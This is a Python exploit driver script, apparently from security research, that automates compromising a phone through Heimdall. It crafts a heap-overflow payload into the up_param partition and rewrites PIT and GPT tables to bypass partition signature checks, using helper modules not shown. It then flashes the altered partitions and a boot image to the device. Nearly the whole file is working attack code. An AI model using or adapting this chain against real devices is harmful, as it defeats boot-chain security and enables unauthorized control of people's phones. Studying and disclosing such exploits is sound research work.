"""
@file this_is_fine.py
@brief Main script to exploit the phone :)
@author Gabrielle Viala
"""

from pathlib import Path
import argparse
import subprocess
import time

RETRY_DELAY = 5
TIMEOUT = 24
def flash_phone(heimdall, pit_file, gpt_file, up_param_file, boot_file=None):
    retry = TIMEOUT
    while retry > 0:
        try:
            subprocess.run([heimdall, "detect"],check=True)
            break
        except subprocess.CalledProcessError as e:
            retry -= 1
            print(f"[.] Retry in {RETRY_DELAY}s")
            time.sleep(RETRY_DELAY)
    if retry == 0:
        print(f"[x] Time out!")
        exit(-1)
    if boot_file:
        subprocess.run([heimdall, "flash", "--boot", boot_file],check=True)
    else:
        subprocess.run([heimdall, "flash", "--vbmeta_vendor", pit_file, "--md5hdr", up_param_file, "--pgpt", gpt_file],check=True)


if __name__ == "__main__":
    
    parser = argparse.ArgumentParser()
    parser.add_argument('command', choices=['patch', 'swap', 'flash', 'all'], help="[patch]: craft payload for the heap overflow.\n\t[swap]: craft payload for the partition authentication bypass.\n\t[flash]: flash the partitions on the phone.\n\t[all]: perform all the tasks listed before.")
    parser.add_argument('partitions_folder', type=Path, help="directory that contains the phone partitions that will be flashed")
    parser.add_argument('--pit', type=Path, help="path to the pit.bin")
    parser.add_argument('--gpt', type=Path, help="path to the gpt.bin")
    parser.add_argument('--boot', type=Path, help="path to the boot.bin")  
    parser.add_argument('--up_param', type=Path, help="path to the up_param.bin")  
    parser.add_argument('-H', '--heimdall', type=Path, help="path to heimdall binary")
    args = parser.parse_args()

    command = args.command
    if not args.partitions_folder.is_dir():
        args.partitions_folder.mkdir(parents=True, exist_ok=False)

    pit_file = args.pit if args.pit else args.partitions_folder / "pit.bin"
    gpt_file = args.gpt if args.gpt else args.partitions_folder / "gpt.bin"
    boot_file = args.boot  if args.boot else args.partitions_folder / "boot.bin"
    up_param_file = args.up_param  if args.up_param else args.partitions_folder / "up_param.bin"


    if command == 'patch' or command == 'all':
        import heap_overflow
        if up_param_file.is_file():
            up_param_file = heap_overflow.build_partition(up_param_file)
        else:
            print(f"[x] Up_param doesn't exist?")
            exit(-1)

    if command == 'swap' or command == 'all':
        import odin_sig_bypass

        if not pit_file.is_file():
            print(f"[x] Could not find PIT partition")
            exit(-1)

        if not gpt_file.is_file():
            print(f"[x] Could not find GPT partition")
            exit(-1)

        print(f"[!] Modify PIT table in {pit_file}")
        pit_file = odin_sig_bypass.update_pit(pit_file)
        print(f"[!] Modify GPT table in {gpt_file}")
        gpt_file = odin_sig_bypass.update_gpt(gpt_file, pit_file)
        print(f"[+] Output files: {gpt_file} & {pit_file}")

    if command == 'flash' or command == 'all':
        if not args.heimdall:
            print(f"[x] You need to specify the path to Heimdall executable!")
            exit(-1)

        if not pit_file.is_file():
            print(f"[x] Could not find PIT partition")
            exit(-1)

        if not gpt_file.is_file():
            print(f"[x] Could not find GPT partition")
            exit(-1)

        if not up_param_file.is_file():
            print(f"[x] Could not find Up_param partition")
            exit(-1)

        flash_phone(args.heimdall, pit_file, gpt_file, up_param_file, None)


    if command == 'boot' or command == 'all':
        import odin_sig_bypass

        if not boot_file.is_file():
            print(f"[x] Could not find boot partition")
            exit(-1)

        print(f"[!] Wait 4s for the phone to reboot")
        time.sleep(4)
        flash_phone(args.heimdall, None, None, None, boot_file)
